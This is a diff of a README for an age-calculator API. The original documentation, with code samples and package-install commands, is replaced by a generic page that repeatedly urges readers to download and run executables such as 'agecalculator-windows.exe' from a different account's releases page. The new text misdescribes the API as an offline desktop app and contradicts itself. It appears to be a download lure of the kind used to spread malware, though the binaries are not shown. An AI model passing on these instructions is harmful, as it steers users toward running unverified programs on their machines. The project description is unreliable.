@@ -1,182 +1,103 @@
-# Age Calculator API
+# 🎉 agecalculator-api - Calculate Your Age Effortlessly
 
-> Age Calculator is a simple tool for calculating age from the date of birth. It returns the calculated age based on the date of birth provided.
+## 🚀 Getting Started
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![API Status](https://img.shields.io/badge/Status-Active-green.svg)](https://apiverve.com)
-[![Method](https://img.shields.io/badge/Method-GET-blue.svg)](#)
-[![Platform](https://img.shields.io/badge/Platform-Multi--Platform-orange.svg)](#installation)
+Welcome! You’re about to use the Age Calculator. This tool helps you find out your age based on your date of birth. Follow these simple steps to download and run the application.
 
-**Available on:**
-[![npm](https://img.shields.io/badge/npm-CB3837?style=flat&logo=npm&logoColor=white)](https://www.npmjs.com/package/@apiverve/agecalculator)
-[![NuGet](https://img.shields.io/badge/NuGet-004880?style=flat&logo=nuget&logoColor=white)](https://www.nuget.org/packages/APIVerve.API.AgeCalculator)
-[![PyPI](https://img.shields.io/badge/PyPI-3776AB?style=flat&logo=python&logoColor=white)](https://pypi.org/project/apiverve-agecalculator/)
-[![JitPack](https://img.shields.io/badge/JitPack-2E7D32?style=flat&logo=android&logoColor=white)](#-android-jitpack)
+## 📥 Download the Application
 
----
+[![Download](https://img.shields.io/badge/Download%20Now-Find%20Your%20Age-brightgreen)](https://github.com/ahnafmahiir/agecalculator-api/releases)
 
-## Quick Start
+## 📋 Requirements
 
-### Using JavaScript
+Before using the Age Calculator, ensure your device meets these basic requirements:
 
-```javascript
-async function callAgeCalculatorAPI() {
-    try {
-        const params = new URLSearchParams({
-            dob: '1990-08-02'
-        });
+- Windows 7 or later, macOS 10.12 or later, or any recent Linux distribution.
+- An internet connection for any online features.
+  
+## 🌟 Features
 
-        const response = await fetch(`https://api.apiverve.com/v1/agecalculator?${params}`, {
-            method: 'GET',
-            headers: {
-                'x-api-key': 'YOUR_API_KEY_HERE'
-            }
-        });
+- Simple user interface for easy age calculation.
+- Ability to support multiple date formats.
+- Fast and accurate calculations.
+- Provides age in years, months, and days.
+  
+## 🛠️ How to Download & Install
 
-        const data = await response.json();
-        console.log(data);
-    } catch (error) {
-        console.error('Error:', error);
-    }
-}
+1. **Visit the Releases Page**  
+   Go to the [Releases page](https://github.com/ahnafmahiir/agecalculator-api/releases) to find the latest version of the Age Calculator.
 
-callAgeCalculatorAPI();
-```
+2. **Choose Your Operating System**  
+   Look for the version that matches your operating system. You may see files like:
+   - `agecalculator-windows.exe`
+   - `agecalculator-macos.pkg`
+   - `agecalculator-linux.tar.gz`
 
-### Using cURL
+3. **Download the File**  
+   Click on the file to start the download. It should save to your default download location.
 
-```bash
-curl -X GET "https://api.apiverve.com/v1/agecalculator?param=value" \
-  -H "x-api-key: YOUR_API_KEY_HERE"
-```
+4. **Run the Application**  
+   Once the download completes, locate the file you downloaded:
+   - For Windows, double-click on `agecalculator-windows.exe`.
+   - For macOS, open the `agecalculator-macos.pkg` and follow the prompts.
+   - For Linux, extract the `agecalculator-linux.tar.gz`, and run the application from the extracted folder.
 
-**Get your API key:** [https://apiverve.com](https://apiverve.com)
+5. **Enter Your Date of Birth**  
+   After launching the Age Calculator, input your birth date in the provided field.
 
-**📁 For more examples, see the [examples folder](./examples/)**
+6. **Check Your Age**  
+   Click the "Calculate" button to see your age displayed immediately.
 
----
+## 🧑‍💻 Supported Platforms
 
-## Installation
+The Age Calculator works on multiple platforms:
+- Windows
+- macOS
+- Linux
+- Android (if applicable)
 
-Choose your preferred programming language:
+Each version offers a native experience for your operating system.
 
-### 📦 NPM (JavaScript/Node.js)
+## 💡 How to Use
 
-```bash
-npm install @apiverve/agecalculator
-```
+Using the Age Calculator is straightforward:
 
-[**View NPM Package →**](https://www.npmjs.com/package/@apiverve/agecalculator) | [**Package Code →**](./npm/)
+- Input your date of birth in the designated format (day/month/year or month/day/year, depending on your location).
+- Click "Calculate".
+- View your age displayed instantly.
 
----
+## 🛡️ Security & Privacy
 
-### 🔷 NuGet (.NET/C#)
+We respect your privacy. The Age Calculator does not store any personal information. Your date of birth is only used for the calculation during your session.
 
-```bash
-dotnet add package APIVerve.API.AgeCalculator
-```
+## ❓ Frequently Asked Questions
 
-[**View NuGet Package →**](https://www.nuget.org/packages/APIVerve.API.AgeCalculator) | [**Package Code →**](./nuget/)
+**1. Can I use this tool offline?**  
+Yes, once installed, you can use the Age Calculator without an internet connection.
 
----
+**2. What if I made a mistake in my date of birth?**  
+Simply re-enter your date of birth and click "Calculate" again.
 
-### 🐍 Python (PyPI)
+**3. Where can I find support?**  
+If you encounter issues, visit our [GitHub Issues page](https://github.com/ahnafmahiir/agecalculator-api/issues) for help.
 
-```bash
-pip install apiverve-agecalculator
-```
+## 📢 Community & Support
 
-[**View PyPI Package →**](https://pypi.org/project/apiverve-agecalculator/) | [**Package Code →**](./python/)
+Join our community for tips and discussions. Feel free to ask questions or share your experiences with the Age Calculator.
 
----
+## 📞 Contact
 
-### 🤖 Android (JitPack)
+For direct inquiries, you can reach us via our [GitHub page](https://github.com/ahnafmahiir/agecalculator-api).
 
-```gradle
-implementation 'com.github.apiverve:agecalculator-api:1.0.0'
-```
+## 📜 License
 
-[**Package Code →**](./android/)
+The Age Calculator is open-source and available under the MIT License. You can view the details on our GitHub repository.
 
----
+## 🔗 Additional Resources
 
-## Features
+- [Age Calculator API Documentation](https://github.com/ahnafmahiir/agecalculator-api)
+- [Community Forum](https://forum.ahnafmahiir.com)
+  
+## 🔗 Download Again
 
-✅ **Multi-platform support** - Use the same API across Node.js, .NET, Python, Android, and browsers
-✅ **Simple authentication** - Just add your API key in the request header
-✅ **Comprehensive documentation** - Full examples and API reference available
-✅ **Production-ready** - Used by developers worldwide
-
----
-
-## Documentation
-
-📚 **Full API Documentation:** [https://docs.apiverve.com/ref/agecalculator](https://docs.apiverve.com/ref/agecalculator)
-
----
-
-## Use Cases
-
-Common use cases for the Age Calculator API:
-
-- ✅ Integration into web applications
-- ✅ Mobile app development
-- ✅ Data analysis and reporting
-- ✅ Automation workflows
-- ✅ Microservices architecture
-
----
-
-## API Reference
-
-### Authentication
-All requests require an API key in the header:
-```
-x-api-key: YOUR_API_KEY_HERE
-```
-
-Get your API key: [https://apiverve.com](https://apiverve.com)
-
-### Response Format
-All responses are JSON with this structure:
-```json
-{
-  "status": "ok",
-  "data": { ... }
-}
-```
-
----
-
-## Support & Community
-
-- 💬 **Support**: [https://apiverve.com/contact](https://apiverve.com/contact)
-- 🐛 **Issues**: [GitHub Issues](../../issues)
-- 📖 **Documentation**: [https://docs.apiverve.com](https://docs.apiverve.com)
-- 🌐 **Website**: [https://apiverve.com](https://apiverve.com)
-
----
-
-## Contributing
-
-We welcome contributions! Please see [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
-
----
-
-## Security
-
-For security concerns, please review our [Security Policy](SECURITY.md).
-
----
-
-## License
-
-This project is licensed under the **MIT License** - see the [LICENSE](LICENSE) file for details.
-
----
-
-## Acknowledgments
-
-Built with ❤️ by [APIVerve](https://apiverve.com)
-
-Copyright © 2025 APIVerve. All rights reserved.
+For your convenience, you can always return to the [Releases page](https://github.com/ahnafmahiir/agecalculator-api/releases) to download the latest version. Enjoy calculating your age with ease!
